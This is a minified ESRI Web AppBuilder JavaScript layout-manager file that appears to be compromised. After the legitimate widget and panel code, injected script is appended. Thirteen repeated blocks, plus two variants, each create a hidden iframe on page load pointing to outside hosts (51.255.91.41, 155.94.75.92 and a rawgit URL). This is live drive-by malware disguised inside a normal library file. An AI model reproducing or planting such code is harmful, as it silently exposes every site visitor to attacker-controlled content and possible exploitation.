// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"jimu/layoutManagers/BaseLayoutManager":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/html dijit/_WidgetBase dojo/Deferred dojo/promise/all ../utils ../WidgetPlaceholder ../OnScreenWidgetIcon".split(" "),function(p,e,c,f,g,r,h,l,v,k){var t=null,m;m=p([g],{constructor:function(){this.widgetPlaceholders=[];this.onScreenWidgetIcons=[];this.invisibleWidgetIds=[]},name:"BaseLayoutManager",mapId:"map",map:null,layoutId:"jimu-layout-manager",postCreate:function(){this.containerNode=
this.domNode;this.layoutId=jimuConfig.layoutId},resize:function(){},isSupportEdit:function(){return!1},getMapDiv:function(){},setMap:function(a){this.map=a},onEnter:function(a,b){this.appConfig=a;this.mapId=b},onLeave:function(){},onThemeLoad:function(){},loadAndLayout:function(a){},openWidget:function(a){},onLayoutChange:function(a){},onWidgetChange:function(a,b){},onGroupChange:function(a,b){},onWidgetPoolChange:function(a,b){this.reloadControllerWidget(a,b.controllerId)},onActionTriggered:function(a){},
onLayoutDefinitionChange:function(a,b){},onOnScreenGroupsChange:function(a,b){},destroyOnScreenWidgetsAndGroups:function(a){},loadOnScreenWidgets:function(a){var b=[];c.forEach(a.widgetOnScreen.widgets,function(d){!1===d.visible?this.invisibleWidgetIds.push(d.id):b.push(this.loadOnScreenWidget(d,a))},this);return h(b)},loadOnScreenWidget:function(a,b){var d=new r;if("config"===b.mode&&!a.uri)return b=this._createOnScreenWidgetPlaceHolder(a),d.resolve(b),d;if(!a.uri)return d.resolve(null),d;a.inPanel||
a.closeable?(b=this._createOnScreenWidgetIcon(a),d.resolve(b)):this.widgetManager.loadWidget(a).then(e.hitch(this,function(b){try{b.setPosition(b.position),this.widgetManager.openWidget(b)}catch(q){console.log(console.error("fail to startup widget "+b.name+". "+q.stack))}b.configId=a.id;d.resolve(b)}),function(b){d.reject(b)});return d},onOnScreenWidgetChange:function(a,b){b=a.getConfigElementById(b.id);b.isController?this.reloadControllerWidget(a,b.id):(c.forEach(this.widgetPlaceholders,function(d){d.configId===
b.id&&(d.destroy(),this.loadOnScreenWidget(b,a))},this),this.removeDestroyed(this.widgetPlaceholders),this._updatePlaceholder(a),c.forEach(this.onScreenWidgetIcons,function(d){if(d.configId===b.id){var c=d.state;d.destroy();this.loadOnScreenWidget(b,a).then(function(a){if(b.uri&&"opened"===c)a.onClick()})}},this),this.removeDestroyed(this.onScreenWidgetIcons),c.forEach(this.widgetManager.getOnScreenOffPanelWidgets(),function(d){d.configId===b.id&&(d.destroy(),!1===b.visible?0>this.invisibleWidgetIds.indexOf(b.id)&&
this.invisibleWidgetIds.push(b.id):this.loadOnScreenWidget(b,a))},this),c.forEach(this.invisibleWidgetIds,function(d){d===b.id&&!1!==b.visible&&(this.loadOnScreenWidget(b,a),d=this.invisibleWidgetIds.indexOf(b.id),this.invisibleWidgetIds.splice(d,1))},this),b.isOnScreen||c.forEach(this.widgetManager.getControllerWidgets(),function(d){d.widgetIsControlled(b.id)&&this.reloadControllerWidget(a,d.id)},this))},destroyOnScreenWidgetIcons:function(){c.forEach(this.onScreenWidgetIcons,function(a){a.destroy()},
this);this.onScreenWidgetIcons=[]},destroyOnScreenOffPanelWidgets:function(){c.forEach(this.widgetManager.getOnScreenOffPanelWidgets(),function(a){this.widgetManager.destroyWidget(a)},this)},destroyWidgetPlaceholders:function(){c.forEach(this.widgetPlaceholders,function(a){a.destroy()},this);this.widgetPlaceholders=[]},removeDestroyed:function(a){var b=[];c.forEach(a,function(a){a._destroyed&&b.push(a)});c.forEach(b,function(b){b=a.indexOf(b);a.splice(b,1)})},_createOnScreenWidgetPlaceHolder:function(a){var b;
b="map"===a.position.relativeTo?this.mapId:this.layoutId;var d=e.clone(a);d.position.width=40;d.position.height=40;var c=l.getPositionStyle(d.position);a=new v({index:d.placeholderIndex,configId:a.id});f.setStyle(a.domNode,c);f.place(a.domNode,b);this.widgetPlaceholders.push(a);return a},_createOnScreenWidgetIcon:function(a){var b=new k({panelManager:this.panelManager,widgetManager:this.widgetManager,widgetConfig:a,configId:a.id,map:this.map});"map"===a.position.relativeTo?f.place(b.domNode,this.mapId):
f.place(b.domNode,this.layoutId);f.setStyle(b.domNode,l.getPositionStyle({top:a.position.top,left:a.position.left,right:a.position.right,bottom:a.position.bottom,width:40,height:40}));b.startup();!this.openAtStartWidget&&a.openAtStart&&(b.switchToOpen(),this.openAtStartWidget=a.name);this.onScreenWidgetIcons.push(b);return b},reloadControllerWidget:function(a,b){var d=this.widgetManager.getWidgetById(b);if(d){var c=d.getOpenedIds(),q=d.windowState;this._destroyControllerWidget(d);this._loadControllerWidget(a,
b,c,q)}else this._loadControllerWidget(a,b)},_destroyControllerWidget:function(a){c.forEach(a.getAllConfigs(),function(b){if(b.widgets)this.panelManager.destroyPanel(b.id+"_panel"),c.forEach(b.widgets,function(a){this.panelManager.destroyPanel(a.id+"_panel")},this);else{var a=this.widgetManager.getWidgetById(b.id);a&&(b.inPanel?this.panelManager.destroyPanel(a.getPanel()):this.widgetManager.destroyWidget(a))}},this);this.widgetManager.destroyWidget(a)},_loadControllerWidget:function(a,b,d,c){b=a.getConfigElementById(b);
!1!==b.visible&&this.loadOnScreenWidget(b,a).then(e.hitch(this,function(a){c&&this.widgetManager.changeWindowStateTo(a,c);d&&a.setOpenedIds(d)}))},_updatePlaceholder:function(a){c.forEach(this.widgetPlaceholders,function(b){b.setIndex(a.getConfigElementById(b.configId).placeholderIndex)},this)}});m.getInstance=function(){null===t&&(t=new m);return t};return m})},"jimu/WidgetPlaceholder":function(){define(["dojo/_base/declare","dojo/_base/lang","dojo/_base/html","dijit/_WidgetBase","./utils"],function(p,
e,c,f,g){return p(f,{"class":"jimu-widget-placeholder",postCreate:function(){this.inherited(arguments);this.indexNode=c.create("div",{"class":"inner",innerHTML:this.index},this.domNode);c.setAttr(this.domNode,"title",window.jimuNls.widgetPlaceholderTooltip)},moveTo:function(f){var h={left:"auto",right:"auto",bottom:"auto",top:"auto",width:"auto",height:"auto"},h=e.mixin(h,g.getPositionStyle(f));delete h.width;delete h.height;c.setStyle(this.domNode,h)},setIndex:function(c){this.index=c;this.indexNode.innerHTML=
c}})})},"jimu/OnScreenWidgetIcon":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/html dojo/on dijit/_WidgetBase ./utils".split(" "),function(p,e,c,f,g,r,h){return p(r,{"class":"jimu-widget-onscreen-icon",postCreate:function(){this.inherited(arguments);this.iconNode=f.create("img",{src:this.widgetConfig.icon},this.domNode);f.setAttr(this.domNode,"title",this.widgetConfig.label);f.setAttr(this.domNode,"data-widget-name",this.widgetConfig.name);this.own(g(this.domNode,
"click",e.hitch(this,function(){this.onClick()})));this.position=e.clone(this.widgetConfig.position);"map"===this.widgetConfig.position.relativeTo&&this.own(g(this.map,"resize",e.hitch(this,function(){var c=e.clone(this.position);delete c.width;delete c.height;this.panel&&this.panel.setPosition(c)})));this.state="closed"},startup:function(){this.inherited(arguments)},onClick:function(){"closed"===this.state?this.switchToOpen():this.switchToClose()},moveTo:function(c){var l={left:"auto",right:"auto",
bottom:"auto",top:"auto",width:"auto",height:"auto"},l=e.mixin(l,h.getPositionStyle(c));delete l.width;delete l.height;f.setStyle(this.domNode,l);this.position=e.clone(c);this.widgetConfig&&this.widgetConfig.panel&&(this.widgetConfig.panel.position=e.clone(c),this.widgetConfig.position=e.clone(c));this.panel&&this.panel.setPosition(e.clone(c));this.widget&&this.widget.setPosition(this.getOffPanelWidgetPosition(this.widget))},destroy:function(){this.panel?this.panelManager.destroyPanel(this.panel):
this.widget&&this.widgetManager.destroyWidget(this.widget);this.inherited(arguments)},switchToOpen:function(){this.state="opened";this.panelManager.closeAllPanelsInGroup(this.widgetConfig.gid);c.forEach(this.widgetManager.getOnScreenOffPanelWidgets(),function(c){c.closeable&&this.widgetManager.closeWidget(c)},this);f.addClass(this.domNode,"jimu-state-selected");this._showLoading();!1===this.widgetConfig.inPanel?this.widgetManager.loadWidget(this.widgetConfig).then(e.hitch(this,function(c){this.widget=
c;c.setPosition(this.getOffPanelWidgetPosition(c));this.widgetManager.openWidget(c);this.own(g(c,"close",e.hitch(this,function(){this.switchToClose()})));this._hideLoading()})):this.panelManager.showPanel(e.clone(this.widgetConfig)).then(e.hitch(this,function(c){this.panel=c;this.own(g(c,"close",e.hitch(this,function(){this.switchToClose()})));this._hideLoading()}))},switchToClose:function(){this.state="closed";f.removeClass(this.domNode,"jimu-state-selected");!1===this.widgetConfig.inPanel?this.widgetManager.closeWidget(this.widget):
this.panelManager.closePanel(this.panel)},getOffPanelWidgetPosition:function(c){var e={relativeTo:c.position.relativeTo},k=f.getMarginBox(this.domNode);c=this.widgetManager.getWidgetMarginBox(c);var g=f.getMarginBox("map"===e.relativeTo?this.map.id:jimuConfig.layoutId),h=k.t+k.h+1;h+c.h>g.h?e.bottom=g.h-k.t+1:e.top=h;window.isRTL?e.right=0>k.l+k.w-c.w?0:k.l+k.w-c.w:k.l+c.w>g.w?e.right=0:e.left=k.l;return e},_showLoading:function(){f.setAttr(this.iconNode,"src",require.toUrl("jimu")+"/images/loading_circle.gif")},
_hideLoading:function(){f.setAttr(this.iconNode,"src",this.widgetConfig.icon)}})})},"*noref":1}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/html dojo/topic dojo/dom-construct dojo/dom-geometry dojo/promise/all dojo/when ../WidgetManager ../PanelManager ../utils ../dijit/LoadingShelter ./BaseLayoutManager".split(" "),function(p,e,c,f,g,r,h,l,v,k,t,m,a,b){var d=null,u;u=p([b],{name:"AbsolutePositionLayoutManager",constructor:function(){this.widgetManager=k.getInstance();this.panelManager=t.getInstance();g.subscribe("changeMapPosition",e.hitch(this,this.onChangeMapPosition));
this.onScreenGroupPanels=[]},map:null,resize:function(){c.forEach(this.widgetManager.getAllWidgets(),function(a){!1===a.inPanel&&a.resize()},this)},setMap:function(a){this.inherited(arguments);this.panelManager.setMap(a)},getMapDiv:function(){return f.byId(this.mapId)?f.byId(this.mapId):f.create("div",{id:this.mapId,style:e.mixin({position:"absolute",backgroundColor:"#EEEEEE",overflow:"hidden",minWidth:"1px",minHeight:"1px"},m.getPositionStyle(this.appConfig.map.position))},this.layoutId)},loadAndLayout:function(b){console.time("Load widgetOnScreen");
this.setMapPosition(b.map.position);var n=new a,q=[];n.placeAt(this.layoutId);n.startup();q.push(this.loadOnScreenWidgets(b));c.forEach(b.widgetOnScreen.groups,function(a){q.push(this._loadOnScreenGroup(a,b))},this);l(q).then(e.hitch(this,function(){n&&(n.destroy(),n=null);console.timeEnd("Load widgetOnScreen");g.publish("preloadWidgetsLoaded")}),e.hitch(this,function(){n&&(n.destroy(),n=null);console.timeEnd("Load widgetOnScreen");g.publish("preloadWidgetsLoaded")}))},destroyOnScreenWidgetsAndGroups:function(){this.panelManager.destroyAllPanels();
this.destroyOnScreenOffPanelWidgets();this.destroyWidgetPlaceholders();this.destroyOnScreenWidgetIcons()},openWidget:function(a){c.forEach(this.onScreenWidgetIcons,function(b){b.configId===a&&b.switchToOpen()},this);c.forEach(this.widgetManager.getControllerWidgets(),function(b){b.widgetIsControlled(a)&&b.setOpenedIds([a])},this)},onLayoutChange:function(a){this._changeMapPosition(a);c.forEach(this.widgetPlaceholders,function(b){b.moveTo(a.getConfigElementById(b.configId).position)},this);c.forEach(this.onScreenWidgetIcons,
function(b){b.moveTo(a.getConfigElementById(b.configId).position)},this);c.forEach(this.widgetManager.getOnScreenOffPanelWidgets(),function(b){if(!b.closeable){var c=a.getConfigElementById(b.id).position;b.setPosition(c)}},this);c.forEach(this.onScreenGroupPanels,function(b){var c=a.getConfigElementById(b.config.id).panel.position;b.setPosition(c)},this)},onWidgetChange:function(a,b){b=a.getConfigElementById(b.id);this.onOnScreenWidgetChange(a,b);c.forEach(this.onScreenGroupPanels,function(a){a.reloadWidget(b)},
this)},onGroupChange:function(a,b){b=a.getConfigElementById(b.id);b.isOnScreen?(this.panelManager.destroyPanel(b.id+"_panel"),this.removeDestroyed(this.onScreenGroupPanels),this._loadOnScreenGroup(b,a)):(c.forEach(this.widgetManager.getControllerWidgets(),function(c){c.isControlled(b.id)&&this.reloadControllerWidget(a,c.id)},this),c.forEach(this.panelManager.panels,function(a){a.config.id===b.id&&a.updateConfig(b)},this))},onActionTriggered:function(b){"highLight"===b.action&&(c.forEach(this.widgetPlaceholders,
function(a){a.configId===b.elementId&&this._highLight(a)},this),c.forEach(this.onScreenWidgetIcons,function(a){a.configId===b.elementId&&this._highLight(a)},this),c.forEach(this.widgetManager.getOnScreenOffPanelWidgets(),function(a){a.configId===b.elementId&&this._highLight(a)},this),c.forEach(this.onScreenGroupPanels,function(a){a.configId===b.elementId&&this._highLight(a)},this));"removeHighLight"===b.action&&this._removeHighLight();"showLoading"===b.action&&(f.setStyle(jimuConfig.loadingId,"display",
"block"),f.setStyle(jimuConfig.mainPageId,"display","none"));"showApp"===b.action&&(f.setStyle(jimuConfig.loadingId,"display","none"),f.setStyle(jimuConfig.mainPageId,"display","block"))},onChangeMapPosition:function(a){var b=e.clone(this.mapPosition);e.mixin(b,a);this.setMapPosition(b)},setMapPosition:function(a){this.mapPosition=a;a=m.getPositionStyle(a);f.setStyle(this.mapId,a);this.map&&this.map.resize&&this.map.resize()},getMapPosition:function(){return this.mapPosition},_highLight:function(a){if(a.domNode){this.hlDiv&&
this._removeHighLight(a);var b=h.getMarginBox(a.domNode);this.hlDiv=r.create("div",{style:{position:"absolute",left:b.l+"px",top:b.t+"px",width:b.w+"px",height:b.h+"px"},"class":"icon-highlight"},a.domNode,"before")}},_removeHighLight:function(){this.hlDiv&&(r.destroy(this.hlDiv),this.hlDiv=null)},_changeMapPosition:function(a){this.map&&(m.isEqual(this.getMapPosition(),a.map.position)||this.setMapPosition(a.map.position))},_loadOnScreenGroup:function(a,b){return b.mode||a.widgets&&0!==a.widgets.length?
this.panelManager.showPanel(a).then(e.hitch(this,function(b){b.configId=a.id;this.onScreenGroupPanels.push(b);return b})):v(null)}});u.getInstance=function(){null===d&&(d=new u,window._absolutLayoutManager=d);return d};return u});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});